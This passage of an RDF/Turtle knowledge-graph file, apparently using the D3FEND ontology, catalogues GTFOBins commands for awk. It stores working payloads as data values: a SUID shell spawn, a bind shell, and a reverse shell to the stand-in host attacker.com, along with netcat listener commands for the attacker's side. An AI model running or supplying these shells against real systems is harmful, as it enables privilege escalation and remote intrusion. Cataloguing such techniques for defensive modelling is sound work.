awk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
""" .

mknd:command_awk-limited-suid a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "awk-limited-suid" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_awk ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_awk ;
    mknd:provides mknd:function_limited-suid ;
    mknd:value "./awk 'BEGIN {system(\"/bin/sh\")}'" .

mknd:command_awk-non-interactive-bind-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "awk-non-interactive-bind-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc target.com 12345` on the attacker box to connect to the shell." ;
    d3f:uses mknd:executable_awk ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_awk ;
    mknd:provides mknd:function_non-interactive-bind-shell ;
    mknd:value """LPORT=12345
awk -v LPORT=$LPORT 'BEGIN {
    s = "/inet/tcp/" LPORT "/0/0";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
""" .

mknd:command_awk-non-interactive-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "awk-non-interactive-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc -l -p 12345` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_awk ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_awk ;
    mknd:provides mknd:function_non-interactive-reverse-shell ;
    mknd:value """RHOST=attacker.com
RPORT=12345
awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = "/inet/tcp/0/" RHOST "/" RPORT;
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
""" .

